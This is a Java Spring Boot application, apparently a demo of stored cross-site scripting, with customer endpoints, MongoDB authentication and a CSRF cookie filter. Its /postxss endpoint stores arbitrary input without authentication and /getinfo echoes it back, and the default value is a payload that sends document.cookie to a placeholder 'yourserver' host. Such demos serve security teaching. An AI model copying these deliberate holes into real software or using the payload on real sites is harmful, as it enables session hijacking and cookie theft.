package demo;

import java.io.IOException;
import java.security.Principal;
import java.util.HashMap;
import java.util.Map;
import java.util.UUID;

import javax.servlet.Filter;
import javax.servlet.FilterChain;
import javax.servlet.FilterConfig;
import javax.servlet.ServletException;
import javax.servlet.ServletRequest;
import javax.servlet.ServletResponse;
import javax.servlet.http.Cookie;
import javax.servlet.http.HttpServletResponse;

import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.boot.SpringApplication;
import org.springframework.boot.autoconfigure.SpringBootApplication;
import org.springframework.boot.autoconfigure.security.SecurityProperties;
import org.springframework.context.annotation.Configuration;
import org.springframework.core.annotation.Order;
import org.springframework.data.mongodb.repository.config.EnableMongoRepositories;
import org.springframework.security.access.annotation.Secured;
import org.springframework.security.config.annotation.authentication.builders.AuthenticationManagerBuilder;
import org.springframework.security.config.annotation.method.configuration.EnableGlobalMethodSecurity;
import org.springframework.security.config.annotation.web.builders.HttpSecurity;
import org.springframework.security.config.annotation.web.configuration.WebSecurityConfigurerAdapter;
import org.springframework.security.web.csrf.CsrfToken;
import org.springframework.security.web.session.SessionManagementFilter;
import org.springframework.web.bind.annotation.RequestBody;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.RequestMethod;
import org.springframework.web.bind.annotation.RestController;

@SpringBootApplication
@RestController
@EnableGlobalMethodSecurity
@EnableMongoRepositories
public class UiApplication {

    @Autowired
    CustomerRepository customers;

    @Autowired
    DemoUserRepository users;

    @Autowired
    private MongoDBAuthenticationProvider authenticationProvider;

    private String xssInputData = new String(
        "<p> <input type='button' name='Redirect' class='btn btn-primary' value='Submit' "
            + "onclick='<img src=x onerror=this.src='http://yourserver/?c='+document.cookie>' /></p>");

    @RequestMapping("/user")
    public Principal user(Principal user) {
        return user;
    }

    @RequestMapping(value = "/getallcustomer", method = RequestMethod.GET)
    public DemoResponse getResource() {
        DemoResponse response = new DemoResponse("Done", customers.findAll());
        return response;
    }

    @Secured("USER")
    @RequestMapping(value = "/postcustomer", method = RequestMethod.POST)
    public DemoResponse postCustomer(@RequestBody Customer customer) {
        customers.save(customer);
        DemoResponse response = new DemoResponse("Done", customer);
        return response;
    }

    @RequestMapping(value = "/postxss", method = RequestMethod.POST)
    public DemoResponse postXSS(@RequestBody String xssInput) {
        xssInputData = new String(xssInput);
        DemoResponse response = new DemoResponse("Done", xssInput);
        return response;
    }

    @Secured("USER")
    @RequestMapping("/resource")
    public Map<String, Object> home() {
        Map<String, Object> model = new HashMap<String, Object>();
        model.put("id", UUID.randomUUID().toString());
        model.put("content", "Hello World");
        return model;
    }

    @RequestMapping("/getinfo")
    public DemoResponse info() {
        DemoResponse response = new DemoResponse("Done", new String(this.xssInputData));
        return response;
    }

    public static void main(String[] args) {
        SpringApplication.run(UiApplication.class, args);
    }

    //    @RequestMapping("/addUser")
    //    public void addUsers() {
    //        StandardPasswordEncoder encoder = new StandardPasswordEncoder();
    //        users.deleteAll();
    //        users.save(new DemoUser("test", encoder.encode("password"), true, "USER"));
    //        customers.save(new Customer("John", "Smith"));
    //    }

    //    @Autowired
    //    public void configureGlobal(AuthenticationManagerBuilder auth) throws Exception {
    //        auth.inMemoryAuthentication().withUser("test").password("password").roles("USER");
    //    }

    @Autowired
    public void configureGlobal(AuthenticationManagerBuilder auth) throws Exception {
        //StandardPasswordEncoder encoder = new StandardPasswordEncoder();
        //users.deleteAll();
        //SimpleGrantedAuthority role = new SimpleGrantedAuthority("USER");
        //users.save(new DemoUser("test", encoder.encode("password"), true, Arrays.asList(role)));

        auth.authenticationProvider(authenticationProvider);
    }

    @Configuration
    @Order(SecurityProperties.ACCESS_OVERRIDE_ORDER)
    protected static class SecurityConfiguration extends WebSecurityConfigurerAdapter {
        @Override
        protected void configure(HttpSecurity http) throws Exception {

            String[] patterns = new String[] {"/index.html", "/home.html", "/login1.html", "/xss2.html", "/",
                "/xss1.html", "customerspage.html", "/xss", "/js/*.js", "/login", "/resource", "/postcustomer",
                "/getallcustomer", "/getinfo",
                "/postxss"};

            // @formatter:off
            //http.httpBasic();
            //http.authorizeRequests().antMatchers("/**").permitAll(); //.anyRequest().authenticated();
            //http.csrf().disable();

            http.headers().httpStrictTransportSecurity();
            //http.formLogin().defaultSuccessUrl("/").and().logout().and().authorizeRequests().
            http.httpBasic().and().authorizeRequests().
                antMatchers(patterns).permitAll().anyRequest().authenticated();
            http.csrf().and().addFilterAfter(new CsrfGrantingFilter(), SessionManagementFilter.class);

            //http.csrf().csrfTokenRepository(CookieCsrfTokenRepository.withHttpOnlyFalse());
            // @formatter:on
        }

        protected class CsrfGrantingFilter implements Filter {
            @Override
            public void init(FilterConfig filterConfig) throws ServletException {}

            @Override
            public void doFilter(ServletRequest servletRequest, ServletResponse servletResponse,
                FilterChain filterChain) throws IOException, ServletException {
                CsrfToken csrf = (CsrfToken)servletRequest.getAttribute(CsrfToken.class.getName());
                String token = csrf.getToken();
                if (token != null) {
                    HttpServletResponse response = (HttpServletResponse)servletResponse;
                    Cookie cookie = new Cookie("CSRF-TOKEN", token);
                    cookie.setPath("/");
                    response.addCookie(cookie);
                }
                filterChain.doFilter(servletRequest, servletResponse);
            }

            @Override
            public void destroy() {}
        }
    }
}
